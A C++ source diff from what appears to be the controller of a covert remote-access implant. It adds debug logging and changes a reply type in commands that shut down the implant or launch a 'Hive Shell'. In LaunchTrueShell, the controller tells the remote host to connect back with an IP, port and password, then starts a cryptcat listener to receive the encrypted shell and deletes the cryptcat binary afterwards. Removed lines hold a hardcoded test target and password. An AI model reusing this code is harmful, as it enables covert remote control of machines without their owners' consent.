@@ -26,6 +26,7 @@ extern "C" {
 }
 
 //*******************************************************************************
+
 using namespace InterfaceLibrary;
 using namespace InterfaceLibrary::Primitive;
 
@@ -38,14 +39,15 @@ char cryptcat_path[] = "cryptcat";
 //*******************************************************************************
 void Command::Execute( Primitive::Activation& actvn, ProcessCmdAccumulator& , ProcessCmdResponse& resp )
 {
-	struct send_buf sbuf;
-	struct recv_buf rbuf;
-	String		*argPtr = (String *)(actvn.arguments);
-	String		args = *argPtr++;
-	string		command = args;
+	struct send_buf	sbuf;
+	REPLY			rbuf;
+	String			*argPtr = (String *)(actvn.arguments);
+	String			args = *argPtr++;
+	string			command = args;
 
+	DL(6);
 	memset( &sbuf, 0, sizeof( struct send_buf ) );
-	memset( &rbuf, 0, sizeof( struct recv_buf ) );
+	memset( &rbuf, 0, sizeof( REPLY ) );
 
 	resp.type = ProcessCmdResponse::TYPE_Pending;
 
@@ -73,14 +75,15 @@ void Command::Execute( Primitive::Activation& actvn, ProcessCmdAccumulator& , Pr
 //*******************************************************************************
 void Command::Session( Primitive::Activation& actvn, ProcessCmdAccumulator&, ProcessCmdResponse& resp )
 {
-	struct send_buf sbuf;
-	struct recv_buf rbuf;
-	String		*argPtr = (String *)(actvn.arguments);
-	String		args = *argPtr++;
-	string		command = args;
+	struct send_buf	sbuf;
+	REPLY			rbuf;
+	String			*argPtr = (String *)(actvn.arguments);
+	String			args = *argPtr++;
+	string			command = args;
 
+	DL(6);
 	memset( &sbuf, 0, sizeof( struct send_buf ) );
-	memset( &rbuf, 0, sizeof( struct recv_buf ) );
+	memset( &rbuf, 0, sizeof( REPLY ) );
 
 	resp.type = ProcessCmdResponse::TYPE_Remote_Failure;
 	printf( " ! This feature is not implemented\n" );
@@ -112,11 +115,12 @@ void Command::Session( Primitive::Activation& actvn, ProcessCmdAccumulator&, Pro
 //*******************************************************************************
 void Command::Exit( Primitive::Activation&, ProcessCmdAccumulator&, ProcessCmdResponse& resp )
 {
-	struct send_buf sbuf;
-	struct recv_buf rbuf;
+	struct send_buf	sbuf;
+	REPLY			rbuf;
 
+	DL(6);
 	memset( &sbuf, 0, sizeof( struct send_buf ) );
-	memset( &rbuf, 0, sizeof( struct recv_buf ) );
+	memset( &rbuf, 0, sizeof( REPLY ) );
 
 	resp.type = ProcessCmdResponse::TYPE_Pending;
 
@@ -152,6 +156,7 @@ Command::ShutDown::ShutDown() {
 
 //	cout << "Creating ShutDownCmd Object" << endl;
 
+	DL(6);
 	referenceID = 33;
 	setTitle("now");
 	helpText = "Task server to close open files, network connections, and terminate. Does not effect execution upon reboot.";
@@ -169,12 +174,13 @@ Command::ShutDown::ShutDown() {
 //*******************************************************************************
 ProcessCmdResponse Command::ShutDown::Process(binary&)
 {
-    ProcessCmdResponse resp;
-	struct send_buf sbuf;
-	struct recv_buf rbuf;
+    ProcessCmdResponse	resp;
+	struct send_buf		sbuf;
+	REPLY				rbuf;
 
+	DL(6);
 	memset( &sbuf, 0, sizeof( struct send_buf ) );
-	memset( &rbuf, 0, sizeof( struct recv_buf ) );
+	memset( &rbuf, 0, sizeof( REPLY ) );
 
 //    cout << "Processing Command::ShutDown" << endl;
 
@@ -210,6 +216,7 @@ Command::LaunchTrueShell::LaunchTrueShell() {
 
 //	cout << "Creating ShutDownCmd Object" << endl;
 
+	DL(6);
 	referenceID = 34;
 	setTitle("open");
 	helpText = "Initiate shell connection with remote host.";
@@ -235,11 +242,11 @@ Command::LaunchTrueShell::LaunchTrueShell() {
 //*******************************************************************************
 ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 {
-    ProcessCmdResponse resp;
-	struct send_buf sbuf;
-	struct recv_buf rbuf;
-	int				fd;
-	int				rv = 0;
+    ProcessCmdResponse	resp;
+	struct send_buf		sbuf;
+	REPLY				rbuf;
+	int					fd;
+	int					rv = 0;
 
 //	ostringstream text;
 
@@ -256,11 +263,12 @@ ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 	// Will we ever be on other Linux boxes without gnome? 
 	char gnomeTerminalCommand[255];
 
+	DL(6);
 	const ShellArgs &args = *(ShellArgs*)arguments.data;
-	printf( " . ip_len %i, ip %s\n", args.ip_len, args.ip_str );
+	DLX(4,printf(" . ip_len %i, ip %s\n", args.ip_len, args.ip_str));
 
 	memset( &sbuf, 0, sizeof( struct send_buf ) );
-	memset( &rbuf, 0, sizeof( struct recv_buf ) );
+	memset( &rbuf, 0, sizeof( REPLY ) );
 
 	resp.type = ProcessCmdResponse::TYPE_Pending;
 
@@ -286,14 +294,6 @@ ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 	// TODO: Jeremy should inspect his code which fills the sbuf with the command string
 	snprintf(sbuf.path, 254, "%s %s %s", args.ip_str, args.port_str, args.pass_str);
    	sbuf.size=strlen(sbuf.path);
-	// TODO: Jeremy should delete this commented section below which was hardcoded and tested 21 Oct 2011...
-	//sprintf(sbuf.path, "10.3.2.35 4321 metallica");  
-	//sbuf.size=strlen("10.3.2.35 4321 metallica");
-
-	printf("\n\n  NOTE FOR SOLARIS ONLY:  Keep all shells open until you are done.\n");
-	printf("      Once you close any solaris shell, the trigger will appear normal\n");
-	printf("      but it is no longer connected.  In this case, you must quit the\n");
-	printf("      trigger and then retrigger the device.\n\n\n");
 	
 	if ( myConn->TxCommand( &sbuf, &rbuf, LAUNCHTRUESHELL ) < 0 )
 	{
@@ -306,18 +306,29 @@ ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 	{
 		int forkret;
 
-	//	printf( " * Requested Shell Connection\n" );
+		DLX(6, printf("Launching Shell...\n"));
 		resp.type = ProcessCmdResponse::TYPE_Success;
 	   //Original code
 		//system( "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p 4321" );
 		//Modified 21 Oct 2011 to accept user input with password...
 		// TODO :  Currently we use a gnome-terminal command down below which was defined above...  
 		// Will we ever be on other Linux boxes without gnome?  
+		// An alternative is xterm. The following command string has been successfully used:
+		//	snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
+
 		memset( gnomeTerminalCommand, 0, 255);    //Clear it out before we use it...
+//		snprintf( gnomeTerminalCommand, 254, "xterm -T 'Hive Shell' -e ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
 		snprintf( gnomeTerminalCommand, 254, "gnome-terminal -t 'Hive Shell' -x ./cryptcat -l -p %s -k %s", args.port_str, args.pass_str);
+		DLX(6, printf("Forking...\n"));
 		forkret = fork();
 		if (forkret == 0) {
-			system( gnomeTerminalCommand );
+			int ret;
+
+			DLX(6, printf("Child process executing shell command (\"%s\")...\n", gnomeTerminalCommand));
+			ret = system( gnomeTerminalCommand );
+			if (ret == -1)
+				printf("ERROR: Could not  open terminal\n");
+			DLX(6, printf("Shell terminated, associated child exiting in 5 seconds\n"));
 			sleep( 5 );
 			unlink( cryptcat_path );
 			exit(0);
@@ -326,6 +337,7 @@ ProcessCmdResponse Command::LaunchTrueShell::Process(binary& arguments)
 		// sleep added to avoid race condition where unlink() removes the file
 		// before system()->gnome-terminal() can execute it.
 		// yes, we know this is not the best way...
+		DLX(6, printf("Parent sleeping 5 seconds...\n"));
 		sleep( 5 );
 		// no checking return value because if unlink() fails, we won't do anything about it anyway
 		unlink( cryptcat_path );
